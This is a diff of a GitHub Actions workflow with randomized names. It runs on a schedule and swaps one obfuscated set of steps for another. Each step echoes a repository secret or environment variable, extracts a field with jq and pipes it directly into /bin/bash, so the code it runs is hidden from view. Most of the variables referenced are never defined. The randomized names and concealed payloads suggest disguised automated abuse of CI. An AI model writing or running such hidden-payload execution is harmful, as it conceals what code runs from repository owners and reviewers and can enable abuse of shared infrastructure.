@@ -2,25 +2,22 @@ name: xuejingxin7641
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
-jobs:  # 3776
+    - cron: '46 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xuejingxin7641
         env:
-          rnya11: ${{ secrets.rnya11 }}
+          hl32: ${{ secrets.hl32 }}
         run: |
-          echo $rnya11 | jq -r .vxs82785 | /bin/bash
-          echo $zgen2 | jq -r .egito772 | /bin/bash
-          echo $rfjb39 | jq -r .pzx8 | /bin/bash
-          echo $u15267 | jq -r .c6358 | /bin/bash
-          echo $clnh4 | jq -r .g3 | /bin/bash
-          echo $pf5572 | jq -r .gihe980 | /bin/bash
-          echo $wh55583 | jq -r .oekdv244 | /bin/bash
-          echo $wpgl764 | jq -r .mmln4 | /bin/bash
-          echo $zf0205 | jq -r .hii73 | /bin/bash
-          echo $u385 | jq -r .qsqr69637 | /bin/bash
-          echo $n44696 | jq -r .rbo8047 | /bin/bash
+          echo $hl32 | jq -r .vsrrs118 | /bin/bash
+          echo $pvv1043 | jq -r .llak8 | /bin/bash
+          echo $ignu1706 | jq -r .odjt090 | /bin/bash
+          echo $p62067 | jq -r .qhmby88776 | /bin/bash
+          echo $o7 | jq -r .ek46777 | /bin/bash
+          echo $u38 | jq -r .rlszm82880 | /bin/bash
+          echo $o8 | jq -r .tc2715 | /bin/bash
 
